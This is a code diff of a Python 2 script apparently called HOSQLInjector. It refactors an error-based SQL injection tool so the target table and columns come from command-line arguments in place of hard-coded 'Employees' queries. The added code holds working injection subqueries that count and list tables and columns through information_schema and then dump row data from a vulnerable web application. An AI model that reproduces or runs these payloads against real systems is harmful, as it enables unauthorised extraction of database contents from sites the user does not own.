@@ -10,31 +10,18 @@ import setting as set
 # Setting Argument
 
 
-
-
-
-
-
-
-def prologue():
-    print "==================HOSQLInjector=================="
-    print ""
-
-
-
-#dho dksehla
-
-# def union_sql():
-
-def error_based_sql():
+def error_based_sql(db_type):
     #First checking table nums
-    get_cnt_query('t')
-    get_cnt_query('c')
-    get_cnt_query('d')
-
+    if set.args.column != "" and set.args.table != "":
+        get_cnt_query('d')
+    elif set.args.table != "":
+        get_cnt_query('c')
+    else: #구현쓰중
+        print('c')
+        get_cnt_query('t')
 
 def get_data(div,count):
-    print "Finded "+count+" data"
+    print "Finded "+count+" Data"
     print "============LEAK============"
     for i in range(0,int(count)):
         vuln_part = get_data_query(div,i)
@@ -44,27 +31,27 @@ def get_data(div,count):
 
 def get_data_query(div,count):
     if   div == 't':
-        tname  = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+1+offset+"+str(count)+")"
+        tname  = "(select table_name from information_schema.tables where table_type='base table' limit 1 offset "+str(count)+")"
         return tname
     elif div == 'c':
-        cname = "(select+column_name+from+information_schema.columns+where+table_name='Employees'+limit+1+offset+"+str(count)+")"
+        cname = "(select column_name from information_schema.columns where table_name='"+set.args.table+"' limit 1 offset "+str(count)+")"
         return cname
     elif div == 'd':
-        dname = "(select+concat_ws(0x2c,EmployeeID,FirstName,Title,Salary)+from+Employees+limit+1+offset+"+str(count)+")"
+        dname = "(select concat_ws(0x2c,"+set.args.column+") from "+set.args.table+" limit 1 offset "+str(count)+")"
         return dname
 
 
 def get_cnt_query(div):
     if div == 't':
-        tcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"  # table  개수 확인
+        tcount = "(select count(*) from information_schema.tables where table_type='base table')"  # table  개수 확인
         count  = set.vuln_httpreq(tcount)
         get_data('t',count)
     elif div == 'c':
-        ccount = "(select+count(*)+from+information_schema.columns+where+table_name='Employees')"  # column 개수 확인
+        ccount = "(select count(*) from information_schema.columns where table_name='"+set.args.table+"')"  # column 개수 확인
         count  = set.vuln_httpreq(ccount)
         get_data('c',count)
     elif div == 'd':
-        dcount = "(select+count(*)+from+Employees)"                                                #data 개수 확인
+        dcount = "(select count(*) from "+set.args.table+")"                                                #data 개수 확인
         count  = set.vuln_httpreq(dcount)
         get_data('d',count)
 
